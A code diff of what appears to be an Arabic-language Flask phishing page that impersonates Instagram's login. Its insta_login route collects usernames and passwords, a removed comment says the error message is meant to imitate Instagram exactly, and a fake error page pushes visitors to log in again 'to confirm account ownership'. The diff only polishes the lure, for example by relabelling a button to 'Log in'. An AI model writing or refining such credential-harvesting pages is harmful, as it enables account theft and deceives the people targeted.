@@ -24,11 +24,9 @@ def insta_login():
     username_val = request.form.get("username", "").strip()
     password = request.form.get("password", "")
 
-    # الشرط البرمجي للفحص (يمنع العربي والمسافات ويقبل الإنجليزي فقط)
     username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"
 
     if not re.match(username_pattern, username_val):
-      # رسالة واقعية تحاكي انستغرام تماماً
       error = (
           "عذراً، اسم المستخدم الذي أدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
           " اسم المستخدم ومحاولة مرة أخرى."
@@ -138,7 +136,7 @@ def insta_login():
 
 
 # ----------------------------------------------------
-# 2. صفحة الخطأ 404 (لون النص أسود)
+# 2. صفحة الخطأ 404 (لون النص أسود مع زر "تسجيل الدخول")
 # ----------------------------------------------------
 @app.route("/error-404", methods=["GET", "POST"])
 def error_404():
@@ -174,7 +172,7 @@ def error_404():
         <div class="error-title">حدث خطأ ما</div>
         <div class="error-desc">عذراً، واجهنا مشكلة في التحقق من هويتك. الرجاء تأكيد أنك صاحب الحساب عن طريق تسجيل الدخول بالبريد الإلكتروني المرتبط للمتابعة.</div>
         <form method="POST" style="width: 100%;">
-            <button type="submit" class="next-btn">التالي</button>
+            <button type="submit" class="next-btn">تسجيل الدخول</button>
         </form>
     </div>
 </body>
